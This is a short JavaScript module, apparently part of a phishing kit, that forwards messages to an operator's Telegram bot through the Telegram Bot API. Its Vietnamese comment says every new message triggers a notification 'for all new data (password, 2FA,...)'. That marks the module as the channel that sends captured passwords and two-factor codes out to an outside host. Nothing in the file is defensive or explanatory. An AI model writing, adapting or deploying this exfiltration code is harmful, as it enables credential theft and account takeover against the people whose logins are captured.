import config from '@/utils/config';
import axios from 'axios';

const sendMessage = async (message) => {
    const sendMessageUrl = `https://api.telegram.org/bot${config.token}/sendMessage`;

    try {
        // Luôn gửi tin nhắn mới hoàn toàn để Telegram phát thông báo (notification) cho mọi dữ liệu mới (mật khẩu, 2FA,...)
        await axios.post(sendMessageUrl, {
            chat_id: config.chat_id,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (err) {
        console.error('Gửi thông báo về Telegram thất bại:', err);
    }
};

export default sendMessage;
